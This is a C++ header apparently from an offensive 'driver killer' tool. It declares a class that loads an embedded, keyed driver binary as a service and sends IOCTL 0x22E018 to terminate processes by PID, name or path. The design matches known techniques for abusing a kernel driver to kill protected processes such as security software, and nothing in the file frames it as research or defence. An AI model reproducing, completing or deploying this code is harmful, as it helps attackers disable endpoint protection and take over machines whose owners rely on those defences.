#pragma once
#include <windows.h>
#include <string>
#include "DriverService.hpp"
#include "Singleton.hpp"
#include "ObjectProxy.hpp"
#include "DriverKiller.hpp"
#include "ShdrvBin.hpp"

class Shdrv final :
	public DriverKiller<Shdrv>,
	public Singleton<Shdrv>
{
	friend class Singleton<Shdrv>;

private:
	static constexpr ULONG IOCTL_KILL_PROCESS = 0x22E018u;

public:
	explicit Shdrv(Token) noexcept : Shdrv()
	{
	}
	~Shdrv() = default;

	BOOLEAN InitKiller() noexcept
	{
		return Initialize(ShdrvBin::hexData,
						  ShdrvBin::hexSize,
						  ShdrvBin::service,
						  ShdrvBin::serviceSize,
						  ShdrvBin::Key);
	}


	BOOLEAN
		KillProcess(ULONG Pid);

	BOOLEAN
		KillProcess(const std::string& ProcessName);

	BOOLEAN
		KillProcess(const std::wstring& ProcessPath);

private:
	Shdrv() = default;
};



inline constexpr ObjectProxy<Shdrv> g_Shdrv{};

